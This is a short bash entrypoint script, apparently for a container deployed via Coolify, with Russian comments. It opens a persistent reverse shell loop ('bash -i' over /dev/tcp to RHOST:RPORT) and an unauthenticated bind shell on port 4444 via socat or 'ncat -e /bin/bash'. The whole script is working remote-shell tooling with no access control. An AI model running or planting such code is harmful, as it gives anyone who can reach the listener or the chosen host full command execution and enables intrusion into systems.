#!/usr/bin/env bash
set -u

BIND_PORT="${BIND_PORT:-4444}"

# Reverse shell (если заданы RHOST/RPORT): контейнер сам цепляется к листенеру.
# Работает в фоне, параллельно с bind shell ниже.
if [[ -n "${RHOST:-}" && -n "${RPORT:-}" ]]; then
  echo "[*] reverse shell loop -> ${RHOST}:${RPORT}"
  (
    while true; do
      bash -i >& "/dev/tcp/${RHOST}/${RPORT}" 0>&1
      sleep 5
    done
  ) &
fi

if [[ -n "${BIND_PORT}" && "${BIND_PORT}" != "0" ]]; then
  # Bind shell: снаружи `nc <host> ${BIND_PORT}`
  # SHELL_MODE=ncat (default, без pty, надёжно) | socat (pty, для интерактива)
  if [[ "${SHELL_MODE:-ncat}" == "socat" ]]; then
    echo "[*] bind shell (socat, pty) on 0.0.0.0:${BIND_PORT}"
    exec socat "TCP-LISTEN:${BIND_PORT},reuseaddr,fork" EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
  else
    echo "[*] bind shell (ncat) on 0.0.0.0:${BIND_PORT}"
    exec ncat -lvk -p "${BIND_PORT}" -e /bin/bash
  fi
else
  # Idle: shell через веб-терминал Coolify (Execute Command)
  echo "[*] idle mode: sleep infinity"
  exec sleep infinity
fi
